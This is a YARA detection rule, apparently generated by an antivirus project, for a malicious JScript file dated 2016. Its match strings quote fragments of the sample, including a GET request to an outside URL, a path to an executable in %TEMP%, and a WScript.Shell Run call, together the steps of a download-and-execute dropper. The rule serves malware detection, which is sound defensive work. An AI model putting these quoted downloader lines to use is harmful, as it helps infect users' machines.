rule sig_20160328_424badba155867d4592161ad32e4d87a {
  meta:
    description = "datamaliciousorder - file 20160328_424badba155867d4592161ad32e4d87a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c6f0a273159f4ac17eeaeb7a1d854d8d26cf635cf10cbf25d4c70caed7b1eda0"

  strings:
    $s1  = "function Pfftylq() {return Sojcmr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"W0JaAcZFtcIG.exe\";};" fullword ascii
    $s2  = "Mlwizzxbqa[Tkeanpws](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Cnzll](Muvqk() * 11)} while (Mlwizzxbqa[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Sojcmr = function Efhqubatb() {return WScript[Zymqn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rbdrep(Hmhqsl, Zctlsjs){return Hmhqsl - Zctlsjs;};" fullword ascii
    $s6  = "function Mrccxwlhec() {return ((Wwldkxzzim == true) && (Wwldkxzzim == Yhijxu)) ? 1 : Pfqdw;};" fullword ascii
    $s7  = "function Njahhd(Zjgufgzkr){Sojcmr[\"Run\"](Zjgufgzkr, Pfqdw, Pfqdw);};" fullword ascii
    $s8  = "function Bkizeumos(Mamcslv) {var Jzybae = (1, 2, 3, 4, 5, Mamcslv); return Jzybae;};" fullword ascii
    $s9  = "function Oiqcxdfbl(){return Ueixnw;};" fullword ascii
    $s10 = " while (Eyizhko){" fullword ascii
    $s11 = "Yhijxu = true; " fullword ascii
    $s12 = "function Mtynn(){return Zymqn;};" fullword ascii
    $s13 = "function Ihtog()" fullword ascii
    $s14 = "var Yhijxu = false;" fullword ascii
    $s15 = "return Rbdrep(Bisls, Hfdrapra);" fullword ascii
    $s16 = "var Wwldkxzzim = false;" fullword ascii
    $s17 = "var Mouqfx = false;" fullword ascii
    $s18 = "function Muvqk(){return 22;};" fullword ascii
    $s19 = "var Ggjokkvivn = new this[\"Date\"]();" fullword ascii
    $s20 = "Wwldkxzzim = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}